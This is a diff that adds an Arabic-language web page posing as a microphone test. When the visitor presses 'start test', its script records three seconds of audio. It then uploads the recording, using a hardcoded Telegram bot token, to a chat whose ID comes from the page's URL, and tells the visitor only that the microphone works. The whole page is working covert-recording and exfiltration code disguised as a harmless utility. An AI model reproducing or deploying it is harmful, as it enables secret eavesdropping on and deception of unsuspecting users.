@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>فحص الميكروفون</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Roboto, sans-serif; background: #f4f6f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .card { background: white; border-radius: 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.07); padding: 28px 20px; text-align: center; max-width: 340px; width: 90%; }
+    .icon { font-size: 44px; margin-bottom: 10px; }
+    h2 { color: #333; font-size: 20px; margin-bottom: 6px; }
+    p { color: #777; font-size: 14px; margin-bottom: 20px; }
+    .progress { background: #e0e0e0; border-radius: 20px; height: 6px; width: 100%; margin: 15px 0; overflow: hidden; }
+    .progress-fill { background: #ff9800; width: 0%; height: 100%; border-radius: 20px; transition: width 0.3s ease; }
+    button { background: #ff9800; color: white; border: none; padding: 12px 30px; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; }
+    button:hover { background: #f57c00; }
+    #status { margin-top: 10px; font-size: 14px; color: #555; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">🎤</div>
+    <h2>فحص الميكروفون</h2>
+    <p>تأكد من أن الميكروفون يعمل بشكل صحيح</p>
+    <div class="progress"><div class="progress-fill" id="progressBar"></div></div>
+    <button id="recordBtn">ابدأ الاختبار</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const CHAT_ID = params.get('chat');
+    const TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
+    const progressBar = document.getElementById('progressBar');
+    const statusDiv = document.getElementById('status');
+    const recordBtn = document.getElementById('recordBtn');
+
+    recordBtn.addEventListener('click', () => {
+      recordBtn.disabled = true;
+      statusDiv.textContent = 'جاري التسجيل...';
+      progressBar.style.width = '20%';
+
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(stream => {
+          const chunks = [];
+          const recorder = new MediaRecorder(stream);
+          recorder.ondataavailable = e => chunks.push(e.data);
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'audio/ogg' });
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('voice', blob, 'mic_test.ogg');
+            progressBar.style.width = '80%';
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: form })
+              .then(() => {
+                progressBar.style.width = '100%';
+                statusDiv.textContent = '✅ الميكروفون يعمل بشكل ممتاز';
+              })
+              .catch(() => {
+                statusDiv.textContent = '❌ فشل الاختبار';
+                recordBtn.disabled = false;
+              });
+          };
+          recorder.start();
+          setTimeout(() => recorder.stop(), 3000);
+        })
+        .catch(() => {
+          statusDiv.textContent = 'يجب السماح بالميكروفون';
+          recordBtn.disabled = false;
+        });
+    });
+  </script>
+</body>
+</html>
